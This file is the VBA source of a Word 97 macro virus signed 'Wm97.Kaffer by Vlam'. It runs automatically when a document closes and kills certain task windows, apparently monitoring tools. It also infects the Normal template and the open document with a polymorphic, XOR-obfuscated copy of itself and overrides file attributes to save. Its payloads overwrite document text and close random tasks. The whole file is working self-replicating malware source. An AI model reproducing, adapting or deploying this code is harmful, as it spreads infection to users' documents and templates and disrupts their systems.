Attribute VB_Name = "ThisDocument1"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub Kaffer()
End Sub
Private Sub Document_Close()
Dothis
End Sub
Private Sub AutoClose()
Dothis
End Sub
Private Function rndm(a)
Randomize Timer
rndm = Int(Rnd * a) + ((0 Xor 0 Xor 0) Xor 1)
End Function
Private Function spa()
Randomize Timer
spa = Space(rndm(((0 Xor 0 Xor 0) Xor 40)))
End Function
Private Function num(aa)
Randomize Timer
Select Case aa
Case 0
Select Case rndm(6)
Case 1: num = Crypt("­µ¥ıê÷¥µ¥ıê÷¥µ¬", 133)
Case 2: num = Crypt("ªäëúª²¬»»»»»««", 130)
Case 3: num = Crypt("¬íêğ¬´ª½½½½½­­", 132)
Case 4: num = Crypt("ïöç¿¨µçöî", 199)
Case 5: num = Crypt("^YCOXE", 55)
Case 6: num = Crypt("ı³¼­ıäõ­º§õäüü", 213)
End Select
Case 1
Select Case rndm(6)
Case 1: num = Crypt("ºº¢²êıà²¢²êıà²¢»²êıà²£»", 146)
Case 2: num = Crypt("ìì¢­¼ìôêııııııííä¼«¶äõí", 196)
Case 3: num = Crypt("ğğ±¶¬ğèöáááááññø ·ªøéñ", 216)
Case 4: num = Crypt("–‡ßÈÕ‡–‡ßÈÕ‡–", 167)
Case 5: num = Crypt("§§æáû§¾¯÷àı¯¾¦¦¯¯÷àı¯¾¦", 143)
Case 6: num = Crypt("óó½²£óêû£´©ûêòòû£´©ûêò", 219)
End Select
End Select
End Function
Private Sub Mutate()
Select Case rndm(3)
Case 1: b = spa & Crypt("$WFWJW9#Y!5'Y!54_", 119) & num(1) & Crypt("(/bnedlnetmd", 1)
Case 2: b = spa & Crypt("dZG[}\A^R_gV^C_RGVeqcA\YVPGeqp\^C\]V]G@", 51) & num(1) & Crypt("œ•æĞÁ•ÛÚÇØÔÙ„•ˆ•›ÖÚÑĞØÚÑÀÙĞ•ğÛÑ•âÜÁİ", 181)
Case 3: b = spa & Crypt("Ùçúæ®ÀáüãïâÚëãşâïúë´®Ùçúæ® ØÌŞüáäëíú´®Ùçúæ® ØÌÍáãşáàëàúı¦", 142) & num(1) & Crypt("°£¹Êüí¹÷öëôøõ¨¹¤¹·úöıüôöıìõü£¹Ü÷ı¹Îğíñ£¹Ü÷ı¹Îğíñ£¹Ü÷ı¹Îğíñ", 153)
End Select
Select Case rndm(3)
Case 1: c = spa & Crypt("İëú®úæçı¿®³®Úæçıêáíûãëàú ØÌŞüáäëíú ØÌÍáãşáàëàúı¦", 142) & num(1) & Crypt("¢¥èäïîæäïşçî", 139)
Case 2: c = spa & Crypt("åÛÆÚ’æÚÛÁÖİÑÇß×ÜÆœäğâÀİØ×ÑÆœäğñİßÂİÜ×ÜÆÁš", 178) & num(1) & Crypt("|ou0!u!=<&duhu{6:108:1 90ou;1u<!=", 85)
Case 3: c = spa & Crypt("Æøåù±åùøâõşòäüôÿå«±Æøåù±¿ÇÓÁãşûôòå«±Æøåù±¿ÇÓÒşüáşÿôÿåâ¹", 145) & num(1) & Crypt("¯¼¦Õãò¦òîïõ·¦»¦¨åéâãëéâóêã¼¦Ãèâ¦Ñïòî¼¦Ãèâ¦Ñïòî¼¦Ãèâ¦Ñïòî", 134)
End Select
Select Case rndm(3)
Case 1: d = spa & Crypt("$>298}`})54.ls1438.u", 93) & num(1) & Crypt("±«­­´", 157)
Case 2: d = spa & Crypt("Ëõèô¼Èôõïøóÿéñùòè²ÊŞÌîóöùÿè²ÊŞßóñìóòùòèï´", 156) & num(1) & Crypt("øëñœ¨²¾µ´ñìñÿ²¾µ´¼¾µ¤½´ÿ½¸¿´¢ù", 209) & num(1) & Crypt("âøşşçîôî‹ ªî™§º¦", 206)
Case 3: d = spa & Crypt("ëÕÈÔœÈÔÕÏØÓßÉÑÙÒÈ†œëÕÈÔœ’êşìÎÓÖÙßÈ†œëÕÈÔœ’êşÿÓÑÌÓÒÙÒÈÏ”", 188) & num(1) & Crypt("¸«±Üèòşõô±¬±¿Òşõôüşõäıô¿ıøÿôâ¹", 145) & num(1) & Crypt("®´²²«¢¸Çìæ¢Õëöê¸¢Çìæ¢Õëöê¸¢Çìæ¢Õëöê", 130)
End Select
Select Case rndm(3)
Case 1: e = spa & Crypt("ğÎÓÏ‡ÉÈÕÊÆË–", 167)
Case 2: e = spa & Crypt("Üâÿã«åäùæêçÿîæûçêÿî¥ıéûùäáîèÿ¥ıéèäæûäåîåÿø¥âÿîæ£", 139) & num(1) & Crypt("¤£îâéèàâéøáè", 141)
Case 3: e = spa & Crypt("øæûç¯áàıâîãûêâÿãîûê¡ùíÿıàåêìû¡ùíìàâÿàáêáûü§", 143) & num(1) & Crypt("™ÓßÔÕİßÔÅÜÕ", 176)
End Select
Select Case rndm(2)
Case 1: f = spa & Crypt("v<=4=,=416=+x", 88) & num(1) & Crypt("\P^", 112)
Case 2: f = spa & Crypt("54)6:7ju?>7>/>725>({", 91) & num(1) & Crypt("]\A^R_P\F]G\U_Z]V@", 51)
End Select
Select Case rndm(3)
Case 1: g = spa & Crypt("é¦££¡µ¨ª´³µ®© çª¾¤¨£¢", 199)
Case 2: g = spa & Crypt("4stihnvsti:", 26) & num(1) & Crypt("ÀÔÎÂÉÈ", 173)
Case 3: g = spa & Crypt("ëê÷èäé´«äááã÷êèöñ÷ìëâ¥Èüæêáà", 133)
End Select
h = spa & Crypt(".$`7)4(", 64)
Select Case rndm(3)
Case 1: i = spa & Crypt("ßéø¬íïø½¬±¬íïøåúéèãïùáéâø¢ÚÎÜşãæéïø¢ÚÎÏãáüãâéâøÿ¤", 140) & num(1) & Crypt("˜ŸÒŞÕÔÜŞÕÄİÔ", 177)
Case 2: i = spa & Crypt("Öèõé¡àâõè÷äåîâôìäïõ¯×ÃÑóîëäâõ¯×ÃÂîìñîïäïõò©", 129) & num(1) & Crypt("¥¶¬ßéø¬íïø½¬±¬¢ïãèéáãèùàé¶¬Éâè¬Ûåøä", 140)
Case 3: i = spa & Crypt("×éôè áãôéöåäïãõíåîôº ×éôè ®ÖÂĞòïêåãôº ×éôè ®ÖÂÃïíğïîåîôó¨", 128) & num(1) & Crypt("åöìŸ©¸ì­¯¸ıìñìâ¯£¨©¡£¨¹ ©öì‰¢¨ì›¥¸¤öì‰¢¨ì›¥¸¤öì‰¢¨ì›¥¸¤", 204)
End Select
Select Case rndm(3)
Case 1: j = spa & Crypt("RC", 114)
Case 2: j = spa & Crypt("iwjv>}jwh{zq}ks{pj0h|nlqt{}j0h|}qsnqp{pjm6", 30) & num(1) & Crypt(">9txsrzxsb{r", 23)
Case 3: j = spa & Crypt("E[FZSQF[DWV]QG_W\FDPB@]XWQFDPQ]_B]\W\FA[FW_", 50) & num(1) & Crypt("äã®¢©¨ ¢©¸¡¨", 205)
End Select
Select Case rndm(2)
Case 1: k = spa & Crypt("×ØòİßÍÛ–Ò×ĞÛÍ–––×ĞÊ–‡‡‡‡‡——ÆÑÌ—’––Ø×Æ–ÆÑÌ——ÆÑÌ———‚€", 190) & Chr(34) & Crypt("sqjubwf#pva#tn:4\hbeefq+*", 3) & Chr(34) & Crypt("IUXS", 61)
Case 2: k = spa & Crypt("‚ËˆŠ˜ÃÅ‡‚…˜ÃÃÃ‚…ŸÃÛÅÒÒÒÒÒÂÂË“„™ËÚÂÇÃÃ‚“ÃÚË“„™ËÚÂÂË“„™ËÚÂÂÂË×ÕË", 235) & Chr(34) & Crypt("¤¦½¢µ ±Ô§¡¶Ô£¹ÍÃ«¿µ²²±¦Üİ", 244) & Chr(34) & Crypt("q%94?", 81)
End Select
l = spa & Crypt("›ÑĞÙĞÁĞÙÜÛĞÆ•", 181) & num(1) & Crypt("ÿóı°¼¦½§¼µ¿º½¶ ", 211)
Select Case rndm(2)
Case 1: m = spa & Crypt("ì£¦¦¤°­¯±¶°«¬¥â¯»¡­¦§", 194)
Case 2: m = spa & Crypt("KLQGPVNKLGQ", 34) & num(1) & Crypt("s2&<0;:", 95)
End Select
n = spa & Crypt("MFLAN", 40)
o = spa & Crypt("¨£©íº¤¹¥", 205)
P = spa: For oooo = 1 To rndm(6): tp = tp & Crypt(".??#&,.;& !a", 79): Next: P = P & Crypt("$:';s", 83) & tp & Crypt("¨·³®¨©´", 199): tp = ""
q = spa: For oooo = 1 To rndm(6): q = q & Crypt("v9((41;9,176v7(,176+", 88): Next: q = q & Crypt("ŒÔËĞ×ÑÒĞÍÖÇÁÖËÍÌ‚Ÿ‚", 162) & num(0): tp = ""
r = spa: For oooo = 1 To rndm(6): r = r & Crypt("ı²££¿º°²§º¼½ı¼£§º¼½ ", 211): Next: r = r & Crypt("¿òşÿ÷øãüòşÿçôãâøşÿâ±¬±", 145) & num(0): tp = ""
s = spa: For oooo = 1 To rndm(6): s = s & Crypt("ì£²²®«¡£¶«­¬ì­²¶«­¬±", 194): Next: s = s & Crypt("s.<+832/0<1-/20-)}`}", 93) & num(0): tp = ""
u = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ÖÇÇÛŞÔÖÃŞØÙ™", 183): Next: u = u & Crypt("öèõé¡", 129) & tp & Crypt("Ãòòîëáãöëíì", 130): tp = ""
v = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ãŒ½½¡¤®¬¹¤¢£", 205): Next: v = v & Crypt("O_NYYRILX]HUR[", 60) & num(0): tp = ""
w = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("N__CFLN[F@A", 47): Next: w = w & Crypt("©ÔïèğÑîôòæëÅæôîäÂãîóèõ§º§", 135) & num(0): tp = ""
x = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("®Áğğìéãáôéïî", 128): Next: x = x & Crypt(" Êçışâï÷Ïâëüúı®³®ùêÏâëüúıÀáàë", 142): tp = ""
y = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ş±  ¼¹³±¤¹¿¾", 208): Next: y = y & Crypt("¨ÍãÿÄïèâïèáõ¨Çââ¦ÍãÿÅéâã¼»ÄóïêâÍãÿÅéâã®ñâÍãÿÇêòª¦ñâÍãÿÀ··¯ª¦ÍãÿÅçòãáéôÿ¼»¶ª¦Åéëëçèâ¼»", 134) & Chr(34) & Chr(32) & Chr(34): tp = ""
z = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("©æ÷÷ëîäæóîèé", 135): Next: z = z & Crypt("Q:<4_B_<;", 127): tp = ""
more = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ş±  ¼¹³±¤¹¿¾", 208): Next: more = more & Crypt("ñ”º¦¶±»¶±¸¬ñ»»ÿ”º¦œ°»ºåâª¶³»”º¦œ°»º÷¨»”º¦³«óÿ¨»”º¦™çöóÿ”º¦œ¾«º¸°­¦åâïóÿœ°²²¾±»åâÿ", 223) & Chr(34) & Chr(32) & Chr(34): tp = ""
vircode = Array(b, c, d, e, f, g, h, i, j, k, l, m, n, o, P, q, r, s, o, u, v, w, x, y, z, more, o)
For ki = 0 To 26
With ThisDocument: With .VBProject:
With .vbcomponents(1): With .codemodule
.insertlines ki + 2, vircode(ki)
End With: End With
End With: End With
Next
End Sub
Private Function Crypt(klo, key)
Crypt = ""
For i = 1 To Len(klo)
Crypt = Crypt & Chr(Asc(Mid(klo, i, 1)) Xor key)
Next
End Function
Private Sub Dothis()
On Error Resume Next
For i = 1 To Tasks.Count
If LCase(InStr(1, Tasks(i).Name, Crypt("lct", 2))) Then Tasks(i).Close
If LCase(InStr(1, Tasks(i).Name, Crypt("dqct", 2))) Then Tasks(i).Close
Next
Mutate
Kaffer
With NormalTemplate
With .VBProject
With .vbcomponents(1)
With .codemodule
.deletelines 2, 27
End With
End With
End With
End With
With ActiveDocument
With .VBProject
With .vbcomponents(1)
With .codemodule
.deletelines 2, 27
End With
End With
End With
End With
With NormalTemplate
attr = GetAttr(.FullName)
SetAttr .FullName, 0
.Save
SetAttr .FullName, attr
End With
With ActiveDocument
attr = GetAttr(.FullName)
SetAttr .FullName, 0
.SaveAs .FullName
SetAttr .FullName, attr
End With
Select Case ActiveDocument.Content
Case UCase(InStr(1, ActiveDocument.Content.Text, Crypt("HBEEFQ", 3))): Payload_1
Case UCase(InStr(1, ActiveDocument.Content.Text, Crypt("NIRHIR", 6))): Payload_2
End Select
End Sub
Private Sub Payload_1()
With ActiveDocument.Content
With .Font
.Name = (rndm(10))
.Size = (20 + rndm(10))
 .ColorIndex = (rndm(19) - 1)
.Animation = (rndm(6) - 1)
 End With
.Text = Crypt("Ì¥Íäñà¥Îäããà÷ö¥¨¥Ñíàü¥éìîà¥ñê¥÷ğéà¥ğö¥Òíìñàö©¥çğñ¥ñíàü¥ä÷à¥ãğæîàá¥òìñí¥ÄÌÁÖ¥¤", 133)
End With
End Sub
Private Sub Payload_2()
Tasks(rndm(Tasks.Count)).Close
End Sub
' Wm97.Kaffer by Vlam
' Dear AV
' I am currently on the VX side, but one day i will join you.





